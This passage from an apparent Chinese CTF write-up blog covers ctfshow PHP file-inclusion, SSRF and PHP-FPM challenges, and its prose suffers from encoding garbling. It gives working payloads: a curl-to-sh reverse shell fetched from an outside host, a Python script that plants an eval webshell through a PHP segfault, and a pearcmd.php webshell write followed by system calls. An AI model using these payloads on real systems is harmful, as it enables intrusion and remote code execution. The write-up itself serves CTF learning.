¼|sh</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å…¶ä¸­ä¸€ä¸ªåå¼¹shellçš„æ–¹æ³•ã€‚</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https:<span class="comment">//;curl https://your-shell.com/ä½ çš„å…¬ç½‘ipå†’å·ä½ çš„å¼€æ”¾ç«¯å£ç©ºæ ¼|sh</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯æ˜¯å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p><img src="../images/image-20230305170129849.png" alt="image-20230305170129849"></p><p>è¿™ä¸¤ç¯‡æ–‡ç« è¿˜æœ‰å…¶ä»–çš„åå¼¹shellçš„æ–¹æ³•  <a href="https://blog.csdn.net/weixin_45751765/article/details/124160978">æ–‡ç« 1</a>  <a href="https://blog.csdn.net/weixin_45751765/article/details/124160978">æ–‡ç« 2</a></p><h2 id="web808-å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#web808-å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="web808(å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«)"></a>web808(<strong>å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ï¼Œsessionæ–‡ä»¶åŒ…å«getshellï¼Œåˆ©ç”¨Segfaulté—ç•™ä¸‹ä¸´æ—¶æ–‡ä»¶æ–‡ä»¶è¿›è¡Œgetshell</p><p><strong>1.åˆ©ç”¨Segfaulté—ç•™ä¸‹ä¸´æ—¶æ–‡ä»¶æ–‡ä»¶è¿›è¡Œgetshellï¼š</strong></p><p>æ¡ä»¶ï¼šphp7.1.20ä»¥ä¸‹</p><p>åŸç†ï¼šå°±æ˜¯åˆ©ç”¨php crashåï¼Œä¼šå¯¼è‡´ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¿ç•™ä¸‹æ¥ï¼Œç„¶åå¯¹å…¶è¿›è¡Œæ–‡ä»¶åŒ…å«è¾¾åˆ°RCEçš„æƒ…å†µ</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">pç‰›å†™çš„æ–‡ç« </a></p><p>ç»™å‡ºäº†/tmpä¸‹çš„æ–‡ä»¶ï¼Œæ‰€æœ‰ä¸éœ€è¦çˆ†ç ´å‡ºtmpæ–‡ä»¶ï¼Œç›´æ¥åŒ…å«</p><p>å…¶å®å°±æ˜¯è®©ç¨‹åºå´©æºƒçš„åŒæ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆæ–‡ä»¶å°±ä¼šç•™åœ¨/tmpç›®å½•ä¸‹</p><p>phpä»£ç ä¸­ä½¿ç”¨php://filterçš„strip_tags è¿‡æ»¤å™¨, å¯ä»¥è®© php æ‰§è¡Œçš„æ—¶å€™ç›´æ¥å‡ºç° Segment Fault , è¿™æ · php çš„åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œ , å¯¼è‡´ POST çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ç¼“å­˜ç›®å½•ä¸‹ä¸ä¼šè¢«æ¸…é™¤è€Œä¸åƒphpinfoé‚£æ ·ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶æ–‡ä»¶åå°±å¯ä»¥åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">&quot;http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">tmp=re.<span class="title function_ invoke__">findall</span>(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span>(tmp)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadçš„æ„æ€å°±æ˜¯å…ˆæ•´å‡ºtmpçš„æ–‡ä»¶åï¼Œç„¶ååœ¨å»è®¿é—®æ²¡æœ‰è¢«æ¸…ç†çš„æ–‡ä»¶ä¸‹é¢è¿›è¡ŒRCE</p><p><img src="../images/image-20230306162325031.png" alt="image-20230306162325031"></p><h2 id="web809-pearæ–‡ä»¶åŒ…å«-RCE"><a href="#web809-pearæ–‡ä»¶åŒ…å«-RCE" class="headerlink" title="web809(pearæ–‡ä»¶åŒ…å«/RCE)"></a>web809(<strong>pearæ–‡ä»¶åŒ…å«/RCE</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ï¼Œpearcmd.phpæ–‡ä»¶åŒ…å«åˆ°RCE</p><p>1.å®‰è£…äº†pearï¼ˆè¿™æ ·æ‰èƒ½æœ‰pearcmd.phpï¼‰ï¼Œåœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€”with-pearæ‰ä¼šå®‰è£…ã€‚<br>2.å¼€å¯äº†register_argc_argvï¼ŒDockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯register_argc_argvè¿™ä¸ªé…ç½®</p><p>3.å­˜åœ¨æ–‡ä»¶åŒ…å«ä¸”å¯ä»¥åŒ…å«åç¼€ä¸ºphpçš„æ–‡ä»¶ä¸”æ²¡æœ‰<code>open_basedir</code>çš„é™åˆ¶ã€‚</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/a.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230306163611428.png" alt="image-20230306163611428"></p><p>å…ˆç”¨bpå‘åŒ…ï¼Œç„¶åè®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/a.txt</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¯¦ç»†è§£é‡Š </p><p><a href="https://blog.csdn.net/rfrder/article/details/121042290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165691505116782425121278%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165691505116782425121278&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121042290-null-null.185%5Ev2%5Etag_show&amp;utm_term=pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4450">æ–‡ç« </a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">æ–‡ç« 1</a></p><h2 id="web810-SSRFæ‰“PHP-FPM"><a href="#web810-SSRFæ‰“PHP-FPM" class="headerlink" title="web810(SSRFæ‰“PHP-FPM)"></a>web810(<strong>SSRFæ‰“PHP-FPM</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯SSRFæ‰“fastcgiï¼Œä¹‹å‰åœ¨SSRFä¸“é¢˜é‚£è¾¹æ˜¯æ‰“mysqlå’Œredis</p><p>å·¥å…·ä¸‹è½½åœ°å€<code>https://github.com/tarunkant/Gopherus</code><br>æ‰“fastcgiç”¨æ³•ï¼š<br><code>gopherus --exploit fastcgi</code></p><p>è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ï¼Œæ²¡æ‰“é€š </p><p>ç„¶åæŠŠ_åé¢çš„è¯­å¥è¿›è¡Œurlç¼–ç  ç„¶åä¼ å‚å°±èƒ½æ‹¿åˆ°flagã€‚</p><h2 id="web811-file-put-contentsæ‰“PHP-FPM"><a href="#web811-file-put-contentsæ‰“PHP-FPM" class="headerlink" title="web811(file_put_contentsæ‰“PHP-FPM)"></a>web811(<strong>file_put_contentsæ‰“PHP-FPM</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html#autoid-0-0-0">PHP-FPMçš„è§£é‡Š</a></p><p>è¿™é‡Œè¯»å–è·¯å¾„fileï¼Œä¹‹åå†™å›æ–‡ä»¶ä¸­ã€‚è¿™çœ‹ä¼¼ä»€ä¹ˆéƒ½æ²¡æœ‰åšã€‚</p><p>è¿™ä»½ä»£ç å¯ä»¥ç”¨æ¥æ”»å‡»PHP-FPM</p><p>å¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–æ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªç‰¹å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„æŸä¸€ä¸ªç«¯å£ã€‚</p><p>ç°åœ¨å¦‚æœæˆ‘ä»¬ä½¿ç”¨viewFile=ftp://evil-server/file.txté‚£ä¹ˆä¼šå‘ç”Ÿï¼š</p><p>é¦–å…ˆé€šè¿‡ file_get_contents() å‡½æ•°è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½file.txtã€‚<br>ç„¶åå†é€šè¿‡ file_put_contents() å‡½æ•°è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶å°†å…¶ä¸Šä¼ å›file.txtã€‚</p><p>é‚£æ­¤æ—¶ï¼Œåœ¨å®ƒå°è¯•ä½¿ç”¨file_put_contents()ä¸Šä¼ å›å»æ—¶ï¼Œæˆ‘ä»¬å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ°127.0.0.1:9001(fpmçš„ç«¯å£ï¼Œé»˜è®¤æ˜¯9000)<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±åœ¨è¿™ä¸­é—´é€ æˆäº†ä¸€æ¬¡SSRFï¼Œæ”»å‡»php-fpm</p><p><a href="https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167809500916800226543840%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167809500916800226543840&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124038567-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20web811&amp;spm=1018.2226.3001.4187">ç¾½å¸ˆå‚…å†™çš„æ–‡ç« wp</a></p><p>è·Ÿç€è¿™ç¯‡æ–‡ç« æ ä¸çŸ¥é“ä¸ºå•¥ è¿˜æ˜¯æ²¡å¤ç°æˆåŠŸã€‚ã€‚ã€‚ã€‚</p><h2 id="web812-PHP-FPMæœªæˆæƒ"><a href="#web812-PHP-FPMæœªæˆæƒ" class="headerlink" title="web812(PHP-FPMæœªæˆæƒ)"></a>web812(<strong>PHP-FPMæœªæˆæƒ</strong>)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230308205937864.png" alt="image-20230308205937864"></p><p>è¿™é‡Œçš„è¯ <a href="https://blog.csdn.net/miuzzx/article/details/124038567">wp</a></p><h2 id="web813-åŠ«æŒmysqli"><a href="#web813-åŠ«æŒmysqli" class="headerlink" title="web813(åŠ«æŒmysqli)"></a>web813(<strong>åŠ«æŒmysqli</strong>)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;phpinfo&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;php -r &#x27;ctfshow();&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow å¸¸ç”¨å§¿åŠ¿ åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-java ååºåˆ—åŒ–</title>
      <link href="/posts/50ac4231.html"/>
      <url>/posts/50ac4231.html</url>
      
        <content type="html"><![CDATA[<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>javaé‡Œçš„<code>implements</code>å’Œc++é‡Œçš„é‚£ä¸ªç»§æ‰¿æ˜¯ä¸€ä¸ªæ„æ€ï¼Œå°±æ˜¯ä¼šç»§æ‰¿å‰è€…é‡Œçš„å±æ€§å’Œå‡½æ•°ã€‚ è¿™ç¯‡æ–‡ç« æœ‰è¯¦ç»†è®²  â€”-&gt;  <a href="https://juejin.cn/s/%E5%9C%A8java%E4%B8%ADimplements%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D">æ–‡ç« </a></p><p>è¿™ç¯‡æ–‡ç« æ˜¯è®²javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„  æŒºè¯¦ç»†çš„  <a href="https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167724569216800225587158%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=167724569216800225587158&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-107621010-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A8%E8%AE%B2%E8%A7%A3&amp;spm=1018.2226.3001.4187">javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</a></p><p>å¯ä»¥æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè§†é¢‘æ¥å­¦ä¹ javaååºåˆ—å’Œåºåˆ—åŒ– <a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=23c2bbe4623ae526416ea7a1ec4679fc">è§†é¢‘</a></p><p>ä¸Šé¢çš„é‚£ç¯‡æ–‡ç« æ˜¯å’Œä¸‹é¢çš„è§†é¢‘é…å¥—ç€è®²çš„ï¼Œä¹Ÿæœ‰å¯¹ä¸‹é¢çš„ä»£ç çš„ä»‹ç»</p><p>ä»¥ä¸‹æ˜¯è§†é¢‘ä¸­å‡ºç°çš„ä¸‰ä¸ªjavaä»£ç </p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//å¯¹Serializableè¿™ä¸ªæ¥å£é‡Œçš„toStringå‡½æ•°è¿›è¡Œé‡å†™</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> 